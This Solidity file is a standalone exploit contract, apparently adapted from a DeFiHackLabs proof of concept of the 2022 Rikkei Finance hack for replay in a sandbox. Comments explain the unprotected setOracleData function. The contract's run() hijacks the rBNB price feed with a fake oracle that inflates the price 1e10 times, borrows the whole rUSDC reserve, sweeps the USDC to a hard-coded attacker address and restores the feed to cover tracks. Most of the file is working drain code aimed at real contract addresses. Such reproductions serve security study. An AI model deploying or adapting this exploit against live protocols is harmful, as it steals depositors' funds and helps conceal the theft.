// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-04-Rikkei).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// `ContractTest` — and that same test contract impersonates a Chainlink-style feed
// (its `decimals()` / `latestRoundData()` are the fake rBNB price source the oracle
// is redirected to). There is therefore no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack (the
// testExploit body + the two feed-callback functions), so the playground can deploy
// it and record run(). Logic and constants are copied verbatim from
// test/Rikkei_exp.sol.
//
// === VULNERABILITY ===
// Location: SimplePriceOracle.setOracleData (sources/SimplePriceOracle_D55f01/contracts_SimplePriceOracle.sol:29)
//     function setOracleData(address rToken, oracleChainlink _oracle) external {
//         oracleData[rToken] = _oracle;
//     }
// 
// - NO access control (no onlyAdmin, no onlyOwner, no msg.sender check, no timelock).
// - The mapping `oracleData[rToken]` controls what contract is trusted for price of that market.
// - getUnderlyingPrice blindly trusts the returned decimals() + latestRoundData().answer
//   and computes: return 10 ** (18 - decimals) * uint(answer);
// - This price is used by Cointroller.getHypotheticalAccountLiquidityInternal (and borrowAllowed)
//   to compute collateral value = collateralFactor * exchangeRate * oraclePrice * balance
// - Consequence: attacker-controlled price source => arbitrary collateral value => can borrow
//   up to the entire cash of any other market.
//
// === EXPLOIT STEPS (exactly as executed) ===
// 1. Approve rBNB to Cointroller and enterMarkets([rBNB]) so the deposit counts as collateral.
// 2. Call rBNB.mint{value: 0.0001 ether}()  → receive tiny rBNB balance (collateral tokens).
//    Capital outlay: ~$0.04.
// 3. Call ORACLE.setOracleData(address(RBNB), address(this))  → hijack rBNB price feed (permissionless).
// 4. Attacker contract now acts as the Chainlink feed for rBNB:
//    - decimals() returns 8 (matches real feed)
//    - latestRoundData() returns real answer * 1e10
//    Oracle then does 1e10 * (real*1e10) = real_price * 1e10  (1e10× inflation).
// 5. Call RUSDC.borrow( RUSDC.getCash() )  → Cointroller sees massive collateral value from
//    inflated rBNB price; liquidity check passes; borrow drains entire USDC reserves.
// 6. Transfer the USDC out to attacker EOA.
// 7. Restore legitimate feed: setOracleData(RBNB, realChainlink) to cover tracks.
//
// The entire attack requires only the tiny BNB deposit and two setOracleData calls. No flash loan needed.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IRToken {
    function mint() external payable;
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ICointroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
}

interface ISimplePriceOracle {
    function setOracleData(address, address) external;
}

interface IPriceFeed {
    function decimals() external view returns (uint8);
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

contract RikkeiDrain {
    IERC20 constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IRToken constant RBNB = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);
    IRToken constant RUSDC = IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5);
    ICointroller constant COINTROLLER = ICointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
    ISimplePriceOracle constant ORACLE = ISimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);
    IPriceFeed constant CHAINLINK_BNB_USD = IPriceFeed(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);

    address constant ATTACKER = 0x2D4C407BBe49438ED859fe965b140dcF1aaB71a9;

    // 0.0001 BNB collateral deposit (the only capital the attack needs).
    uint256 constant MINT_AMOUNT = 100_000_000_000_000;

    function run() external payable {
        // 1. approve the rBNB market to be moved by the Cointroller.
        RBNB.approve(address(COINTROLLER), type(uint256).max);

        // 2. enter the rBNB market so it counts as collateral.
        address[] memory rTokens = new address[](1);
        rTokens[0] = address(RBNB);
        COINTROLLER.enterMarkets(rTokens);

        // 3. supply 0.0001 BNB to mint a tiny amount of rBNB collateral.
        RBNB.mint{value: MINT_AMOUNT}();

        // 4. hijack the price feed: point rBNB's oracle at THIS contract (no auth).
        ORACLE.setOracleData(address(RBNB), address(this));

        // 5. with rBNB collateral inflated 1e10×, borrow the entire rUSDC cash.
        RUSDC.borrow(RUSDC.getCash());

        // 6. sweep the borrowed USDC to the attacker EOA.
        USDC.transfer(ATTACKER, USDC.balanceOf(address(this)));

        // 7. cover tracks: restore the legitimate Chainlink BNB/USD feed.
        ORACLE.setOracleData(address(RBNB), address(CHAINLINK_BNB_USD));
    }

    // --- fake Chainlink feed (this contract IS the rBNB price source after step 4) ---
    // Keeps decimals == 8 so the oracle's 10**(18-8) = 1e10 factor stays active, but
    // pre-multiplies the real Chainlink answer by 1e10 so the oracle double-applies
    // the scaling and inflates the rBNB price 1e10×.
    //
    // === EXPLOIT MATH DETAIL ===
    // Real Chainlink BNB/USD (at fork): decimals=8, answer ≈ 4.1624753868e10  (i.e. $416.25 * 1e8)
    // Legit oracle computation: 10**(18-8) * answer = 1e10 * 4.162e10 ≈ 4.162e20  (correct 1e18-scaled price)
    // Attacker feed:
    //   decimals() == 8   (unchanged)
    //   answer = real_answer * 1e10
    // Hijacked oracle: 1e10 * (real_answer * 1e10) = real_answer * 1e20 = correct_price * 1e10
    // Result: rBNB collateral value 10 billion times larger than reality.
    function decimals() external view returns (uint8) {
        return CHAINLINK_BNB_USD.decimals();
    }

    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        (roundId, answer, startedAt, updatedAt, answeredInRound) = CHAINLINK_BNB_USD.latestRoundData();
        answer = answer * 1e10;  // <-- the 1e10× multiplier that triggers double-scaling in oracle
    }
}
